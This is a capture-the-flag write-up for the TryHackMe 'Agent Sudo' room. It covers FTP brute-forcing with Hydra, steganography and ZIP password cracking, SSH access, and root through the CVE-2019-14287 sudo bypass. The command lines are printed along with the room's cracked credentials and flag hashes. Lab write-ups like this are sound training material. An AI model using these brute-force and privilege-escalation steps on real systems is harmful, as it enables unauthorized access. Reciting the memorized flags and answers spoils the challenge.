# Agent Sudo — TryHackMe

**Date:** June 2026  
**Difficulty:** Easy  
**Category:** Linux, Steganography, Privilege Escalation  
**Status:** ✅ Completed

---

# 🔍 Summary

Agent Sudo is a beginner-friendly Linux machine that combines web enumeration, FTP credential attacks, steganography, password cracking, and privilege escalation. Initial access is gained by manipulating the HTTP User-Agent header, followed by discovering FTP credentials hidden within images. After obtaining SSH access, a vulnerable version of sudo is exploited to gain root privileges.

---

# 🛠️ Tools Used

- Nmap
- Firefox
- Hydra
- FTP
- ExifTool
- Binwalk
- Zip2John
- John The Ripper
- Steghide
- Searchsploit
- SSH

---

# 📡 Reconnaissance

## Nmap Scan

```bash
nmap -sS -A -T4 MACHINE_IP
```

<img width="857" height="703" alt="Screenshot 2026-06-03 212741" src="https://github.com/user-attachments/assets/68635f5f-0fda-4411-902e-6872b9d88ea0" />


### Open Ports

| Port | Service |
|--------|---------|
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |

The web server displayed a message instructing agents to use their own codename as the User-Agent.

<img width="1047" height="293" alt="Screenshot 2026-06-03 213328" src="https://github.com/user-attachments/assets/f5c06cda-b02d-4adc-869f-15ff2e59a94b" />


---

# 🔍 Web Enumeration

Inspecting the HTTP request revealed the current User-Agent value being sent by the browser.

<img width="2355" height="1323" alt="Screenshot 2026-06-03 213932" src="https://github.com/user-attachments/assets/7e88298e-b64a-4910-9d44-dc7feffa2a14" />


A custom User-Agent was configured in Firefox using:

```text
general.useragent.override = C
```

<img width="2360" height="264" alt="Screenshot 2026-06-03 214314" src="https://github.com/user-attachments/assets/209ecdbc-589e-4d7a-b263-abca697da972" />


Visiting the site with the modified User-Agent revealed a message directed to Agent C.

<img width="1102" height="284" alt="Screenshot 2026-06-03 214443" src="https://github.com/user-attachments/assets/8ecee31e-abbe-4e18-9a47-2cb378fe53a0" />


The page referenced a user named **chris** and hinted that his password was weak.

---

# 🔓 FTP Access

A password attack against the FTP service successfully recovered Chris's credentials.

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://MACHINE_IP
```

<img width="1689" height="179" alt="Screenshot 2026-06-03 214739" src="https://github.com/user-attachments/assets/4d2698e5-e627-452b-bd88-9570015cd7a1" />


Credentials discovered:

```text
Username: chris
Password: crystal
```

Logging into FTP revealed several files.

```bash
ftp MACHINE_IP
```

<img width="2227" height="557" alt="Screenshot 2026-06-03 214935" src="https://github.com/user-attachments/assets/f43db571-85d8-4ecf-912c-40d9ecdf152b" />


---

# 📂 File Analysis

Downloading and reading the first note provided another clue.

```bash
cat To_agentJ.txt
```

<img width="1502" height="907" alt="Screenshot 2026-06-03 230634" src="https://github.com/user-attachments/assets/0e7c5ccd-ae79-4d57-8d71-a7618cc363ed" />


The note stated that the real image was hidden and that Agent J's password was stored inside the fake image.

---

# 🖼️ Steganography Discovery

Metadata inspection revealed suspicious information.

```bash
exiftool cutie.png
```


Using Binwalk uncovered an embedded ZIP archive.

```bash
binwalk -e cutie.png
```


The ZIP password hash was extracted and cracked.

```bash
zip2john 8702.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="850" height="496" alt="Screenshot 2026-06-03 231130" src="https://github.com/user-attachments/assets/c9e7f713-f233-40bd-9721-b90247ee17c1" />


Recovered ZIP password:

```text
alien
```

Extracting the archive revealed another note.

```bash
7z e 8702.zip
```
<img width="615" height="635" alt="Screenshot 2026-06-03 231327" src="https://github.com/user-attachments/assets/61fe01f0-f94c-432c-a12f-31047f1cb126" />


The note contained:

```text
QXJlYTUx
```

Decoding from Base64 produced:

```text
Area51
```

<img width="443" height="86" alt="Screenshot 2026-06-03 231643" src="https://github.com/user-attachments/assets/1bf946a3-bbce-4595-9bd3-7354e61a669a" />


---

# 🔍 Hidden Message Extraction

Using the recovered password on the second image extracted a hidden message.

```bash
steghide extract -sf cute-alien.jpg
```

<img width="1237" height="875" alt="Screenshot 2026-06-03 232148" src="https://github.com/user-attachments/assets/a12699c5-5a40-43af-9a02-c35a9673b91d" />

The extracted message contained Agent J's credentials.


Recovered credentials:

```text
Username: james
Password: hackerrules!
```

---

# 🔓 SSH Access

Using the recovered credentials, SSH access was obtained.

```bash
ssh james@MACHINE_IP
```

The user's desktop contained the first flag.

---

# 🚩 User Flag

```bash
cat user_flag.txt
```


```text
b03d975e8c92a7c04146cfa7a5a313c7
```

---

# ⬆️ Privilege Escalation

An image on the system referenced a vulnerable sudo version.


Searching for the vulnerability produced a public exploit.

```bash
searchsploit --cve 2019-14287
```

<img width="2357" height="340" alt="Screenshot 2026-06-03 234631" src="https://github.com/user-attachments/assets/9598cab8-52c6-4e55-97f2-5c0b35b4510c" />


Reviewing the exploit showed the privilege escalation technique.

<img width="1061" height="1233" alt="Screenshot 2026-06-03 234708" src="https://github.com/user-attachments/assets/65751945-291c-48bd-ba2c-5c01ff1c3a40" />


The machine was vulnerable to **CVE-2019-14287**, allowing execution as root despite sudo restrictions.

```bash
sudo -u#-1 /bin/bash
```

After running the command, a root shell was obtained.

---

# 👑 Root Flag

```bash
cat /root/root.txt
```

<img width="903" height="363" alt="Screenshot 2026-06-03 234855" src="https://github.com/user-attachments/assets/e69408bc-94c1-44b7-b6ba-d2cc06fa3e86" />


```text
b53a02f55b57d4439e3341834d70c062
```

---
<img width="1624" height="885" alt="Screenshot 2026-06-03 234905" src="https://github.com/user-attachments/assets/fd08a272-136e-416a-85bf-ade428ef73fe" />

# 📚 Lessons Learned

- User-Agent headers can be used as part of access control logic.
- FTP credentials are often vulnerable to password attacks.
- Metadata analysis can reveal hidden clues.
- Binwalk is useful for detecting embedded files inside images.
- Steganography can conceal sensitive information within media files.
- Public privilege escalation vulnerabilities should always be patched.
- CVE-2019-14287 allows bypassing sudo user restrictions under specific configurations.

---
